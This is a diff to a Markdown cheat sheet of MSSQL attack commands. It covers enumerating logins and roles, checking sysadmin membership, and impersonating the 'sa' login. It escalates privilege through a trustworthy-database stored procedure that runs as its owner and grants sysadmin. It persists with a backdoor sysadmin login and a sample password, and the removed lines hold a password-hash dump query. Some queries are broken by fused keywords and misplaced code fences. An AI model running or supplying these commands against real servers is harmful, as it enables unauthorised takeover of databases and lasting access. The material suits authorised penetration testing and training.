@@ -55,12 +55,20 @@ SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
 
 ## enum - select records of a table
 ```sql
-SELECT * FROM <databaseName>.dbo.<tableName>
+SELECT * FROM <databaseName>.<schemaName|dbo>.<tableName>
 ```
 
-## enum - Get users
+## enum - Get principals and their server-level roles
 ```sql
-select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadminFROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sidWHERE r.type IN ('S','E','X','U','G');
+```
+
+
+## enum - Get principals and their database-level roles
+will show NULL in case of insufficient privilge
+
+```sql
+SELECT r.name AS role_principal_name, m.name AS member_principal_name FROM sys.database_role_members rm JOIN sys.database_principals r  ON rm.role_principal_id = r.principal_id JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id
 ```
 
 ## enum - Get sysadmins
@@ -68,11 +76,18 @@ select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create
 SELECT name,type_desc,is_disabled FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
 ```
 
-## enum - check admin rights
-```sql
+## enum - check server-level role
 SELECT SYSTEM_USER;
-SELECT IS_SRVROLEMEMBER('sysadmin');
+```sql
+SELECT IS_SRVROLEMEMBER('<role|sysadmin>');
 ```
+
+## enum - check database-level role
+SELECT SYSTEM_USER;
+```sql
+SELECT IS_ROLEMEMBER('<role|db_owner>');
+```
+
 
 ## enum - identify users that we can impersonate
 ```sql
@@ -86,19 +101,34 @@ SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTE
 
 ## privesc - impersonate user
 ```sql
-EXECUTE AS LOGIN = '<user|sa>'
+EXECUTE AS LOGIN = '<user|sa>';
 ```
 
-## persist - Create user with sysadmin privs
+## privesc - grant server-level role
 ```sql
-CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!'
-EXEC sp_addsrvrolemember 'jubeaz', 'sysadmin'
+EXEC sp_addsrvrolemember '<user>', '<role|sysadmin>';
 ```
 
-## persist - add domain user with sysadmin privs
+## privesc - grant server-level role (db_owner / Trustworthy DB)
+```sql
+CREATE PROCEDURE sp_privesc
+WITH EXECUTE AS OWNER
+AS
+	EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin'
+GO
+
+EXECUTE sp_privesc;
+DROP PROCEDURE sp_privesc;
+```
+
+## persist - Create login with sysadmin privs
+```sql
+CREATE LOGIN jubeaz WITH PASSWORD = '<password|Jube@z123!';
+```
+
+## persist - add domain login with sysadmin privs
 ```sql
 create login [<domain_netbios>\<user>] from windows;
-EXEC sp_addsrvrolemember 'jubeaz', 'sysadmin';
 ```
 
 ## execute command
